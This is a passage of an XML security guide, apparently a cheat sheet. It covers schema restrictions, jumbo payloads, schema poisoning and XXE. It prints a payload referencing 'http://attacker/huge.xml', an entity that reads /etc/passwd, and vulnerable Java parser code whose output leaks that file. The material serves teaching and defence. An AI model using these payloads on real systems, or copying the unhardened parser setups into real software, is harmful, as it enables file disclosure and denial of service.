<div class="codehilite"><pre><span></span><code><span class="nt">&lt;xs:element</span> <span class="na">name=</span><span class="s">&quot;denominator&quot;</span><span class="nt">&gt;</span>
 <span class="nt">&lt;xs:simpleType&gt;</span>
  <span class="nt">&lt;xs:restriction</span> <span class="na">base=</span><span class="s">&quot;xs:integer&quot;</span><span class="nt">&gt;</span>
   <span class="nt">&lt;xs:assertion</span> <span class="na">test=</span><span class="s">&quot;$value != 0&quot;</span><span class="nt">/&gt;</span>
  <span class="nt">&lt;/xs:restriction&gt;</span>
 <span class="nt">&lt;/xs:simpleType&gt;</span>
<span class="nt">&lt;/xs:element&gt;</span>
</code></pre></div>

<p>The assertion guarantees that the <code>denominator</code> will not contain the value zero as a valid number and also allows negative numbers to be a valid denominator.</p>
<h5 id="occurrences">Occurrences<a class="headerlink" href="#occurrences" title="Permanent link">&para;</a></h5>
<p>The consequences of not defining a maximum number of occurrences could be worse than coping with the consequences of what may happen when receiving extreme numbers of items to be processed. Two attributes specify minimum and maximum limits: <code>minOccurs</code> and <code>maxOccurs</code>. The default value for both the <code>minOccurs</code> and the <code>maxOccurs</code> attributes is <code>1</code>, but certain elements may require other values. For instance, if a value is optional, it could contain a <code>minOccurs</code> of 0, and if there is no limit on the maximum amount, it could contain a <code>maxOccurs</code> of <code>unbounded</code>, as in the following example:</p>
<div class="codehilite"><pre><span></span><code><span class="nt">&lt;xs:schema</span> <span class="na">xmlns:xs=</span><span class="s">&quot;http://www.w3.org/2001/XMLSchema&quot;</span><span class="nt">&gt;</span>
 <span class="nt">&lt;xs:element</span> <span class="na">name=</span><span class="s">&quot;operation&quot;</span><span class="nt">&gt;</span>
  <span class="nt">&lt;xs:complexType&gt;</span>
   <span class="nt">&lt;xs:sequence&gt;</span>
    <span class="nt">&lt;xs:element</span> <span class="na">name=</span><span class="s">&quot;buy&quot;</span> <span class="na">maxOccurs=</span><span class="s">&quot;unbounded&quot;</span><span class="nt">&gt;</span>
     <span class="nt">&lt;xs:complexType&gt;</span>
      <span class="nt">&lt;xs:all&gt;</span>
       <span class="nt">&lt;xs:element</span> <span class="na">name=</span><span class="s">&quot;id&quot;</span> <span class="na">type=</span><span class="s">&quot;xs:integer&quot;</span><span class="nt">/&gt;</span>
       <span class="nt">&lt;xs:element</span> <span class="na">name=</span><span class="s">&quot;price&quot;</span> <span class="na">type=</span><span class="s">&quot;xs:decimal&quot;</span><span class="nt">/&gt;</span>
       <span class="nt">&lt;xs:element</span> <span class="na">name=</span><span class="s">&quot;quantity&quot;</span> <span class="na">type=</span><span class="s">&quot;xs:integer&quot;</span><span class="nt">/&gt;</span>
      <span class="nt">&lt;/xs:all&gt;</span>
     <span class="nt">&lt;/xs:complexType&gt;</span>
    <span class="nt">&lt;/xs:element&gt;</span>
  <span class="nt">&lt;/xs:complexType&gt;</span>
 <span class="nt">&lt;/xs:element&gt;</span>
<span class="nt">&lt;/xs:schema&gt;</span>
</code></pre></div>

<p>The previous schema includes a root element named <code>operation</code>, which can contain an unlimited (<code>unbounded</code>) amount of buy elements. This is a common finding, since developers do not normally want to restrict maximum numbers of occurrences. Applications using limitless occurrences should test what happens when they receive an extremely large amount of elements to be processed. Since computational resources are limited, the consequences should be analyzed and eventually a maximum number ought to be used instead of an <code>unbounded</code> value.</p>
<h3 id="jumbo-payloads">Jumbo Payloads<a class="headerlink" href="#jumbo-payloads" title="Permanent link">&para;</a></h3>
<p>Sending an XML document of 1GB requires only a second of server processing and might not be worth consideration as an attack. Instead, an attacker would look for a way to minimize the CPU and traffic used to generate this type of attack, compared to the overall amount of server CPU or traffic used to handle the requests.</p>
<h4 id="traditional-jumbo-payloads">Traditional Jumbo Payloads<a class="headerlink" href="#traditional-jumbo-payloads" title="Permanent link">&para;</a></h4>
<p>There are two primary methods to make a document larger than normal:</p>
<ul>
<li>Depth attack: using a huge number of elements, element names, and/or element values.</li>
<li>Width attack: using a huge number of attributes, attribute names, and/or attribute values.</li>
</ul>
<p>In most cases, the overall result will be a huge document. This is a short example of what this looks like:</p>
<div class="codehilite"><pre><span></span><code><span class="nt">&lt;SOAPENV:ENVELOPE</span> <span class="na">XMLNS:SOAPENV=</span><span class="s">&quot;HTTP://SCHEMAS.XMLSOAP.ORG/SOAP/ENVELOPE/&quot;</span>
                  <span class="na">XMLNS:EXT=</span><span class="s">&quot;HTTP://COM/IBM/WAS/WSSAMPLE/SEI/ECHO/B2B/EXTERNAL&quot;</span><span class="nt">&gt;</span>
 <span class="nt">&lt;SOAPENV:HEADER</span> <span class="na">LARGENAME1=</span><span class="s">&quot;LARGEVALUE&quot;</span>
                 <span class="na">LARGENAME2=</span><span class="s">&quot;LARGEVALUE2&quot;</span>
                 <span class="na">LARGENAME3=</span><span class="s">&quot;LARGEVALUE3&quot;</span> <span class="err"></span><span class="nt">&gt;</span>
 ...
</code></pre></div>

<h4 id="small-jumbo-payloads">"Small" Jumbo Payloads<a class="headerlink" href="#small-jumbo-payloads" title="Permanent link">&para;</a></h4>
<p>The following example is a very small document, but the results of processing this could be similar to those of processing traditional jumbo payloads. The purpose of such a small payload is that it allows an attacker to send many documents fast enough to make the application consume most or all of the available resources:</p>
<div class="codehilite"><pre><span></span><code><span class="cp">&lt;?xml version=&quot;1.0&quot;?&gt;</span>
<span class="cp">&lt;!DOCTYPE root [</span>
<span class="cp"> &lt;!ENTITY file SYSTEM &quot;http://attacker/huge.xml&quot; &gt;</span>
]&gt;
<span class="nt">&lt;root&gt;</span><span class="ni">&amp;file;</span><span class="nt">&lt;/root&gt;</span>
</code></pre></div>

<h3 id="schema-poisoning">Schema Poisoning<a class="headerlink" href="#schema-poisoning" title="Permanent link">&para;</a></h3>
<p>When an attacker is capable of introducing modifications to a schema, there could be multiple high-risk consequences. In particular, the effect of these consequences will be more dangerous if the schemas are using <a href="https://www.w3schools.com/xml/xml_dtd_intro.asp">DTD</a> (e.g., file retrieval, denial of service). An attacker could exploit this type of vulnerability in numerous scenarios, always depending on the location of the schema.</p>
<h4 id="local-schema-poisoning">Local Schema Poisoning<a class="headerlink" href="#local-schema-poisoning" title="Permanent link">&para;</a></h4>
<p>Local schema poisoning happens when schemas are available in the same host, whether or not the schemas are embedded in the same XML document .</p>
<h5 id="embedded-schema">Embedded Schema<a class="headerlink" href="#embedded-schema" title="Permanent link">&para;</a></h5>
<p>The most trivial type of schema poisoning takes place when the schema is defined within the same XML document. Consider the following, unknowingly vulnerable example provided by the W3C :</p>
<div class="codehilite"><pre><span></span><code><span class="cp">&lt;?xml version=&quot;1.0&quot;?&gt;</span>
<span class="cp">&lt;!DOCTYPE note [</span>
<span class="cp"> &lt;!ELEMENT note (to,from,heading,body)&gt;</span>
 <span class="cp">&lt;!ELEMENT to (#PCDATA)&gt;</span>
 <span class="cp">&lt;!ELEMENT from (#PCDATA)&gt;</span>
 <span class="cp">&lt;!ELEMENT heading (#PCDATA)&gt;</span>
 <span class="cp">&lt;!ELEMENT body (#PCDATA)&gt;</span>
]&gt;
<span class="nt">&lt;note&gt;</span>
 <span class="nt">&lt;to&gt;</span>Tove<span class="nt">&lt;/to&gt;</span>
 <span class="nt">&lt;from&gt;</span>Jani<span class="nt">&lt;/from&gt;</span>
 <span class="nt">&lt;heading&gt;</span>Reminder<span class="nt">&lt;/heading&gt;</span>
 <span class="nt">&lt;body&gt;</span>Don&#39;t forget me this weekend<span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/note&gt;</span>
</code></pre></div>

<p>All restrictions on the note element could be removed or altered, allowing the sending of any type of data to the server. Furthermore, if the server is processing external entities, the attacker could use the schema, for example, to read remote files from the server. This type of schema only serves as a suggestion for sending a document, but it must contains a way to check the embedded schema integrity to be used safely. Attacks through embedded schemas are commonly used to exploit external entity expansions. Embedded XML schemas can also assist in port scans of internal hosts or brute force attacks.</p>
<h5 id="incorrect-permissions">Incorrect Permissions<a class="headerlink" href="#incorrect-permissions" title="Permanent link">&para;</a></h5>
<p>You can often circumvent the risk of using remotely tampered versions by processing a local schema.</p>
<div class="codehilite"><pre><span></span><code><span class="cp">&lt;!DOCTYPE note SYSTEM &quot;note.dtd&quot;&gt;</span>
<span class="nt">&lt;note&gt;</span>
 <span class="nt">&lt;to&gt;</span>Tove<span class="nt">&lt;/to&gt;</span>
 <span class="nt">&lt;from&gt;</span>Jani<span class="nt">&lt;/from&gt;</span>
 <span class="nt">&lt;heading&gt;</span>Reminder<span class="nt">&lt;/heading&gt;</span>
 <span class="nt">&lt;body&gt;</span>Don&#39;t forget me this weekend<span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/note&gt;</span>
</code></pre></div>

<p>However, if the local schema does not contain the correct permissions, an internal attacker could alter the original restrictions. The following line exemplifies a schema using permissions that allow any user to make modifications:</p>
<div class="codehilite"><pre><span></span><code>-rw-rw-rw-  1 user  staff  743 Jan 15 12:32 note.dtd
</code></pre></div>

<p>The permissions set on <code>name.dtd</code> allow any user on the system to make modifications. This vulnerability is clearly not related to the structure of an XML or a schema, but since these documents are commonly stored in the filesystem, it is worth mentioning that an attacker could exploit this type of problem.</p>
<h4 id="remote-schema-poisoning">Remote Schema Poisoning<a class="headerlink" href="#remote-schema-poisoning" title="Permanent link">&para;</a></h4>
<p>Schemas defined by external organizations are normally referenced remotely. If capable of diverting or accessing the network's traffic, an attacker could cause a victim to fetch a distinct type of content rather than the one originally intended.</p>
<h5 id="man-in-the-middle-mitm-attack">Man-in-the-Middle (MitM) Attack<a class="headerlink" href="#man-in-the-middle-mitm-attack" title="Permanent link">&para;</a></h5>
<p>When documents reference remote schemas using the unencrypted Hypertext Transfer Protocol (HTTP), the communication is performed in plain text and an attacker could easily tamper with traffic. When XML documents reference remote schemas using an HTTP connection, the connection could be sniffed and modified before reaching the end user:</p>
<div class="codehilite"><pre><span></span><code><span class="cp">&lt;!DOCTYPE note SYSTEM &quot;http://example.com/note.dtd&quot;&gt;</span>
<span class="nt">&lt;note&gt;</span>
 <span class="nt">&lt;to&gt;</span>Tove<span class="nt">&lt;/to&gt;</span>
 <span class="nt">&lt;from&gt;</span>Jani<span class="nt">&lt;/from&gt;</span>
 <span class="nt">&lt;heading&gt;</span>Reminder<span class="nt">&lt;/heading&gt;</span>
 <span class="nt">&lt;body&gt;</span>Don&#39;t forget me this weekend<span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/note&gt;</span>
</code></pre></div>

<p>The remote file <code>note.dtd</code> could be susceptible to tampering when transmitted using the unencrypted HTTP protocol. One tool available to facilitate this type of attack is mitmproxy .</p>
<h5 id="dns-cache-poisoning">DNS-Cache Poisoning<a class="headerlink" href="#dns-cache-poisoning" title="Permanent link">&para;</a></h5>
<p>Remote schema poisoning may also be possible even when using encrypted protocols like Hypertext Transfer Protocol Secure (HTTPS). When software performs reverse Domain Name System (DNS) resolution on an IP address to obtain the hostname, it may not properly ensure that the IP address is truly associated with the hostname. In this case, the software enables an attacker to redirect content to their own Internet Protocol (IP) addresses.</p>
<p>The previous example referenced the host <code>example.com</code> using an unencrypted protocol.</p>
<p>When switching to HTTPS, the location of the remote schema will look like <code>https://example/note.dtd</code>. In a normal scenario, the IP of <code>example.com</code> resolves to <code>1.1.1.1</code>:</p>
<div class="codehilite"><pre><span></span><code>$hostexample.com
example.comhasaddress<span class="m">1</span>.1.1.1
</code></pre></div>

<p>If an attacker compromises the DNS being used, the previous hostname could now point to a new, different IP controlled by the attacker <code>2.2.2.2</code>:</p>
<div class="codehilite"><pre><span></span><code>$hostexample.com
example.comhasaddress<span class="m">2</span>.2.2.2
</code></pre></div>

<p>When accessing the remote file, the victim may be actually retrieving the contents of a location controlled by an attacker.</p>
<h5 id="evil-employee-attack">Evil Employee Attack<a class="headerlink" href="#evil-employee-attack" title="Permanent link">&para;</a></h5>
<p>When third parties host and define schemas, the contents are not under the control of the schemas' users. Any modifications introduced by a malicious employee-or an external attacker in control of these files-could impact all users processing the schemas. Subsequently, attackers could affect the confidentiality, integrity, or availability of other services (especially if the schema in use is <a href="https://www.w3schools.com/xml/xml_dtd_intro.asp">DTD</a>).</p>
<h3 id="xml-entity-expansion">XML Entity Expansion<a class="headerlink" href="#xml-entity-expansion" title="Permanent link">&para;</a></h3>
<p>If the parser uses a <a href="https://www.w3schools.com/xml/xml_dtd_intro.asp">DTD</a>, an attacker might inject data that may adversely affect the XML parser during document processing. These adverse effects could include the parser crashing or accessing local files.</p>
<h4 id="sample-vulnerable-java-implementations">Sample Vulnerable Java Implementations<a class="headerlink" href="#sample-vulnerable-java-implementations" title="Permanent link">&para;</a></h4>
<p>Using the <a href="https://www.w3schools.com/xml/xml_dtd_intro.asp">DTD</a> capabilities of referencing local or remote files it is possible to affect the confidentiality. In addition, it is also possible to affect the availability of the resources if no proper restrictions have been set for the entities expansion. Consider the following example code of an XXE.</p>
<p><strong>Sample XML</strong>:</p>
<div class="codehilite"><pre><span></span><code><span class="cp">&lt;!DOCTYPE contacts SYSTEM &quot;contacts.dtd&quot;&gt;</span>
<span class="nt">&lt;contacts&gt;</span>
 <span class="nt">&lt;contact&gt;</span>
  <span class="nt">&lt;firstname&gt;</span>John<span class="nt">&lt;/firstname&gt;</span>
  <span class="nt">&lt;lastname&gt;</span><span class="ni">&amp;xxe;</span><span class="nt">&lt;/lastname&gt;</span>
 <span class="nt">&lt;/contact&gt;</span>
<span class="nt">&lt;/contacts&gt;</span>
</code></pre></div>

<p><strong>Sample DTD</strong>:</p>
<div class="codehilite"><pre><span></span><code><span class="cp">&lt;!ELEMENT contacts (contact*)&gt;</span>
<span class="cp">&lt;!ELEMENT contact (firstname,lastname)&gt;</span>
<span class="cp">&lt;!ELEMENT firstname (#PCDATA)&gt;</span>
<span class="cp">&lt;!ELEMENT lastname ANY&gt;</span>
<span class="cp">&lt;!ENTITY xxe SYSTEM &quot;/etc/passwd&quot;&gt;</span>
</code></pre></div>

<h5 id="xxe-using-dom">XXE using DOM<a class="headerlink" href="#xxe-using-dom" title="Permanent link">&para;</a></h5>
<div class="codehilite"><pre><span></span><code><span class="kn">import</span> <span class="nn">java.io.IOException</span><span class="p">;</span>
<span class="kn">import</span> <span class="nn">javax.xml.parsers.DocumentBuilder</span><span class="p">;</span>
<span class="kn">import</span> <span class="nn">javax.xml.parsers.DocumentBuilderFactory</span><span class="p">;</span>
<span class="kn">import</span> <span class="nn">javax.xml.parsers.ParserConfigurationException</span><span class="p">;</span>
<span class="kn">import</span> <span class="nn">org.xml.sax.InputSource</span><span class="p">;</span>
<span class="kn">import</span> <span class="nn">org.w3c.dom.Document</span><span class="p">;</span>
<span class="kn">import</span> <span class="nn">org.w3c.dom.Element</span><span class="p">;</span>
<span class="kn">import</span> <span class="nn">org.w3c.dom.Node</span><span class="p">;</span>
<span class="kn">import</span> <span class="nn">org.w3c.dom.NodeList</span><span class="p">;</span>

<span class="kd">public</span> <span class="kd">class</span> <span class="nc">parseDocument</span> <span class="p">{</span>
 <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="p">)</span> <span class="p">{</span>
  <span class="k">try</span> <span class="p">{</span>
   <span class="n">DocumentBuilderFactory</span> <span class="n">factory</span> <span class="o">=</span> <span class="n">DocumentBuilderFactory</span><span class="p">.</span><span class="na">newInstance</span><span class="p">();</span>
   <span class="n">DocumentBuilder</span> <span class="n">builder</span> <span class="o">=</span> <span class="n">factory</span><span class="p">.</span><span class="na">newDocumentBuilder</span><span class="p">();</span>
   <span class="n">Document</span> <span class="n">doc</span> <span class="o">=</span> <span class="n">builder</span><span class="p">.</span><span class="na">parse</span><span class="p">(</span><span class="k">new</span> <span class="n">InputSource</span><span class="p">(</span><span class="s">&quot;contacts.xml&quot;</span><span class="p">));</span>
   <span class="n">NodeList</span> <span class="n">nodeList</span> <span class="o">=</span> <span class="n">doc</span><span class="p">.</span><span class="na">getElementsByTagName</span><span class="p">(</span><span class="s">&quot;contact&quot;</span><span class="p">);</span>
   <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">s</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">s</span> <span class="o">&lt;</span> <span class="n">nodeList</span><span class="p">.</span><span class="na">getLength</span><span class="p">();</span> <span class="n">s</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
     <span class="n">Node</span> <span class="n">firstNode</span> <span class="o">=</span> <span class="n">nodeList</span><span class="p">.</span><span class="na">item</span><span class="p">(</span><span class="n">s</span><span class="p">);</span>
     <span class="k">if</span> <span class="p">(</span><span class="n">firstNode</span><span class="p">.</span><span class="na">getNodeType</span><span class="p">()</span> <span class="o">==</span> <span class="n">Node</span><span class="p">.</span><span class="na">ELEMENT_NODE</span><span class="p">)</span> <span class="p">{</span>
       <span class="n">Element</span> <span class="n">firstElement</span> <span class="o">=</span> <span class="p">(</span><span class="n">Element</span><span class="p">)</span> <span class="n">firstNode</span><span class="p">;</span>
       <span class="n">NodeList</span> <span class="n">firstNameElementList</span> <span class="o">=</span> <span class="n">firstElement</span><span class="p">.</span><span class="na">getElementsByTagName</span><span class="p">(</span><span class="s">&quot;firstname&quot;</span><span class="p">);</span>
       <span class="n">Element</span> <span class="n">firstNameElement</span> <span class="o">=</span> <span class="p">(</span><span class="n">Element</span><span class="p">)</span> <span class="n">firstNameElementList</span><span class="p">.</span><span class="na">item</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
       <span class="n">NodeList</span> <span class="n">firstName</span> <span class="o">=</span> <span class="n">firstNameElement</span><span class="p">.</span><span class="na">getChildNodes</span><span class="p">();</span>
       <span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&quot;First Name: &quot;</span>  <span class="o">+</span> <span class="p">((</span><span class="n">Node</span><span class="p">)</span> <span class="n">firstName</span><span class="p">.</span><span class="na">item</span><span class="p">(</span><span class="mi">0</span><span class="p">)).</span><span class="na">getNodeValue</span><span class="p">());</span>
       <span class="n">NodeList</span> <span class="n">lastNameElementList</span> <span class="o">=</span> <span class="n">firstElement</span><span class="p">.</span><span class="na">getElementsByTagName</span><span class="p">(</span><span class="s">&quot;lastname&quot;</span><span class="p">);</span>
       <span class="n">Element</span> <span class="n">lastNameElement</span> <span class="o">=</span> <span class="p">(</span><span class="n">Element</span><span class="p">)</span> <span class="n">lastNameElementList</span><span class="p">.</span><span class="na">item</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
       <span class="n">NodeList</span> <span class="n">lastName</span> <span class="o">=</span> <span class="n">lastNameElement</span><span class="p">.</span><span class="na">getChildNodes</span><span class="p">();</span>
       <span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&quot;Last Name: &quot;</span> <span class="o">+</span> <span class="p">((</span><span class="n">Node</span><span class="p">)</span> <span class="n">lastName</span><span class="p">.</span><span class="na">item</span><span class="p">(</span><span class="mi">0</span><span class="p">)).</span><span class="na">getNodeValue</span><span class="p">());</span>
     <span class="p">}</span>
    <span class="p">}</span>
  <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="n">Exception</span> <span class="n">e</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">e</span><span class="p">.</span><span class="na">printStackTrace</span><span class="p">();</span>
  <span class="p">}</span>
 <span class="p">}</span>
<span class="p">}</span>
</code></pre></div>

<p>The previous code produces the following output:</p>
<div class="codehilite"><pre><span></span><code>$ javac parseDocument.java <span class="p">;</span> java parseDocument
First Name: John
Last Name: <span class="c1">### User Database</span>
...
nobody:*:-2:-2:Unprivileged User:/var/empty:/usr/bin/false
root:*:0:0:System Administrator:/var/root:/bin/sh
</code></pre></div>

<h5 id="xxe-using-dom4j">XXE using DOM4J<a class="headerlink" href="#xxe-using-dom4j" title="Permanent link">&para;</a></h5>
<div class="codehilite"><pre><span></span><code><span class="kn">import</span> <span class="nn">org.dom4j.Document</span><span class="p">;</span>
<span class="kn">import</span> <span class="nn">org.dom4j.DocumentException</span><span class="p">;</span>
<span class="kn">import</span> <span class="nn">org.dom4j.io.SAXReader</span><span class="p">;</span>
<span class="kn">import</span> <span class="nn">org.dom4j.io.OutputFormat</span><span class="p">;</span>
<span class="kn">import</span> <span class="nn">org.dom4j.io.XMLWriter</span><span class="p">;</span>

<span class="kd">public</span> <span class="kd">class</span> <span class="nc">test1</span> <span class="p">{</span>
 <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="p">)</span> <span class="p">{</span>
  <span class="n">Document</span> <span class="n">document</span> <span class="o">=</span> <span class="kc">null</span><span class="p">;</span>
  <span class="k">try</span> <span class="p">{</span>
   <span class="n">SAXReader</span> <span class="n">reader</span> <span class="o">=</span> <span class="k">new</span> <span class="n">SAXReader</span><span class="p">();</span>
   <span class="n">document</span> <span class="o">=</span> <span class="n">reader</span><span class="p">.</span><span class="na">read</span><span class="p">(</span><span class="s">&quot;contacts.xml&quot;</span><span class="p">);</span>
  <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="n">Exception</span> <span class="n">e</span><span class="p">)</span> <span class="p">{</span>
   <span class="n">e</span><span class="p">.</span><span class="na">printStackTrace</span><span class="p">();</span>
  <span class="p">}</span>
  <span class="n">OutputFormat</span> <span class="n">format</span> <span class="o">=</span> <span class="n">OutputFormat</span><span class="p">.</span><span class="na">createPrettyPrint</span><span class="p">();</span>
  <span class="k">try</span> <span class="p">{</span>
   <span class="n">XMLWriter</span> <span class="n">writer</span> <span class="o">=</span> <span class="k">new</span> <span class="n">XMLWriter</span><span class="p">(</span> <span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">,</span> <span class="n">format</span> <span class="p">);</span>
   <span class="n">writer</span><span class="p">.</span><span class="na">write</span><span class="p">(</span> <span class="n">document</span> <span class="p">);</span>
  <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="n">Exception</span> <span class="n">e</span><span class="p">)</span> <span class="p">{</span>
   <span class="n">e</span><span class="p">.</span><span class="na">printStackTrace</span><span class="p">();</span>
  <span class="p">}</span>
 <span class="p">}</span>
<span class="p">}</span>
</code></pre></div>

<p>The previous code produces the following output:</p>
<div class="codehilite"><pre><span></span><code>$ java test1
&lt;?xml <span class="nv">version</span><span class="o">=</span><span class="s2">&quot;1.0&quot;</span> <span class="nv">encoding</span><span class="o">=</span><span class="s2">&quot;UTF-8&quot;</span>?&gt;
&lt;!DOCTYPE contacts SYSTEM <span class="s2">&quot;contacts.dtd&quot;</span>&gt;

&lt;contacts&gt;
 &lt;contact&gt;
  &lt;firstname&gt;John&lt;/firstname&gt;
  &lt;lastname&gt;### User Database
...
nobody:*:-2:-2:Unprivileged User:/var/empty:/usr/bin/false
root:*:0:0:System Administrator:/var/root:/bin/sh
</code></pre></div>

<h5 id="xxe-using-sax">XXE using SAX<a class="headerlink" href="#xxe-using-sax" title="Permanent link">&para;</a></h5>
<div class="codehilite"><pre><span></span><code><span class="kn">import</span> <span class="nn">java.io.IOException</span><span class="p">;</span>
<span class="kn">import</span> <span class="nn">javax.xml.parsers.SAXParser</span><span class="p">;</span>
<span class="kn">import</span> <span class="nn">javax.xml.parsers.SAXParserFactory</span><span class="p">;</span>
<span class="kn">import</span> <span class="nn">org.xml.sax.SAXException</span><span class="p">;</span>
<span class="kn">import</span> <span class="nn">org.xml.sax.helpers.DefaultHandler</span><span class="p">;</span>

<span class="kd">public</span> <span class="kd">class</span> <span class="nc">parseDocument</span> <span class="kd">extends</span> <span class="n">DefaultHandler</span> <span class="p">{</span>
 <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="p">)</span> <span class="p">{</span>
  <span class="k">new</span> <span class="n">parseDocument</span><span class="p">();</span>
 <span class="p">}</span>
 <span class="kd">public</span> <span class="nf">parseDocument</span><span class="p">()</span> <span class="p">{</span>
  <span class="k">try</span> <span class="p">{</span>
   <span class="n">SAXParserFactory</span> <span class="n">factory</span> <span class="o">=</span> <span class="n">SAXParserFactory</span><span class="p">.</span><span class="na">newInstance</span><span class="p">();</span>
   <span class="n">SAXParser</span> <span class="n">parser</span> <span class="o">=</span> <span class="n">factory</span><span class="p">.</span><span class="na">newSAXParser</span><span class="p">();</span>
   <span class="n">parser</span><span class="p">.</span><span class="na">parse</span><span class="p">(</span><span class="s">&quot;contacts.xml&quot;</span><span class="p">,</span> <span class="k">this</span><span class="p">);</span>
  <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="n">Exception</span> <span class="n">e</span><span class="p">)</span> <span class="p">{</span>
   <span class="n">e</span><span class="p">.</span><span class="na">printStackTrace</span><span class="p">();</span>
  <span class="p">}</span>
 <span class="p">}</span>
 <span class="nd">@Override</span>
 <span class="kd">public</span> <span class="kt">void</span> <span class="nf">characters</span><span class="p">(</span><span class="kt">char</span><span class="o">[]</span> <span class="n">ac</span><span class="p">,</span> <span class="kt">int</span> <span class="n">i</span><span class="p">,</span> <span class="kt">int</span> <span class="n">j</span><span class="p">)</span> <span class="kd">throws</span> <span class="n">SAXException</span> <span class="p">{</span>
  <span class="n">String</span> <span class="n">tmpValue</span> <span class="o">=</span> <span class="k">new</span> <span class="n">String</span><span class="p">(</span><span class="n">ac</span><span class="p">,</span> <span class="n">i</span><span class="p">,</span> <span class="n">j</span><span class="p">);</span>
  <span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">tmpValue</span><span class="p">);</span>
 <span class="p">}</span>
<span class="p">}</span>
</code></pre></div>

<p>The previous code produces the following output:</p>
<div class="codehilite"><pre><span></span><code>$ java parseDocument
John
<span class="c1">#### User Database</span>
...
nobody:*:-2:-2:Unprivileged User:/var/empty:/usr/bin/false
root:*:0:0:System Administrator:/var/root:/bin/sh
</code></pre></div>

<h5 id="xxe-using-stax">XXE using StAX<a class="headerlink" href="#xxe-using-stax" title="Permanent link">&para;</a></h5>
<div class="codehilite"><pre><span></span><code><span class="kn">import</span> <span class="nn">javax.xml.parsers.SAXParserFactory</span><span class="p">;</span>
<span class="kn">import</span> <span class="nn">javax.xml.stream.XMLStreamReader</span><span class="p">;</span>
<span class="kn">import</span> <span class="nn">javax.xml.stream.XMLInputFactory</span><span class="p">;</span>
<span class="kn">import</span> <span class="nn">java.io.File</span><span class="p">;</span>
<span class="kn">import</span> <span class="nn">java.io.FileReader</span><span class="p">;</span>
<span class="kn">import</span> <span class="nn">java.io.FileInputStream</span><span class="p">;</span>

<span class="kd">public</span> <span class="kd">class</span> <span class="nc">parseDocument</span> <span class="p">{</span>
 <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="p">)</span> <span class="p">{</span>
  <span class="k">try</span> <span class="p">{</span>
   <span class="n">XMLInputFactory</span> <span class="n">xmlif</span> <span class="o">=</span> <span class="n">XMLInputFactory</span><span class="p">.</span><span class="na">newInstance</span><span class="p">();</span>
   <span class="n">FileReader</span> <span class="n">fr</span> <span class="o">=</span> <span class="k">new</span> <span class="n">FileReader</span><span class="p">(</span><span class="s">&quot;contacts.xml&quot;</span><span class="p">);</span>
   <span class="n">File</span> <span class="n">file</span> <span class="o">=</span> <span class="k">new</span> <span class="n">File</span><span class="p">(</span><span class="s">&quot;contacts.xml&quot;</span><span class="p">);</span>
   <span class="n">XMLStreamReader</span> <span class="n">xmlfer</span> <span class="o">=</span> <span class="n">xmlif</span><span class="p">.</span><span class="na">createXMLStreamReader</span><span class="p">(</span><span class="s">&quot;contacts.xml&quot;</span><span class="p">,</span>
                                            <span class="k">new</span> <span class="n">FileInputStream</span><span class="p">(</span><span class="n">file</span><span class="p">));</span>
   <span class="kt">int</span> <span class="n">eventType</span> <span class="o">=</span> <span class="n">xmlfer</span><span class="p">.</span><span class="na">getEventType</span><span class="p">();</span>
   <span class="k">while</span> <span class="p">(</span><span class="n">xmlfer</span><span class="p">.</span><span class="na">hasNext</span><span class="p">())</span> <span class="p">{</span>
    <span class="n">eventType</span> <span class="o">=</span> <span class="n">xmlfer</span><span class="p">.</span><span class="na">next</span><span class="p">();</span>
    <span class="k">if</span><span class="p">(</span><span class="n">xmlfer</span><span class="p">.</span><span class="na">hasText</span><span class="p">()){</span>
     <span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">print</span><span class="p">(</span><span class="n">xmlfer</span><span class="p">.</span><span class="na">getText</span><span class="p">());</span>
    <span class="p">}</span>
   <span class="p">}</span>
   <span class="n">fr</span><span class="p">.</span><span class="na">close</span><span class="p">();</span>
  <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="n">Exception</span> <span class="n">e</span><span class="p">)</span> <span class="p">{</span>
   <span class="n">e</span><span class="p">.</span><span class="na">printStackTrace</span><span class="p">();</span>
  <span class="p">}</span>
 <span class="p">}</span>
<span class="p">}</span>
</code></pre></div>

<p>The previous code produces the following output:</p>
<div class="codehilite"><pre><span></span><code>$ java parseDocument
&lt;!DOCTYPE contacts SYSTEM <span class="s2">&quot;contacts.dtd&quot;</span>&gt;John### User Database
...
nobody:*:-2:-2:Unprivileged User:/var/empty:/usr/bin/false
root:*:0:0:System Administrator:/var/root:/bin/sh
</code></pre></div>

<h4 id="recursive-entity-reference">Recursive Entity Reference<a class="headerlink" href="#recursive-entity-reference" title="Permanent link">&para;</a></h4>
<p>When the definition of an element <code>A</code> is another element <code>B</code>, and that element <code>B</code> is defined as element <code>A</code>, that schema describes a circular reference between elements:</p>
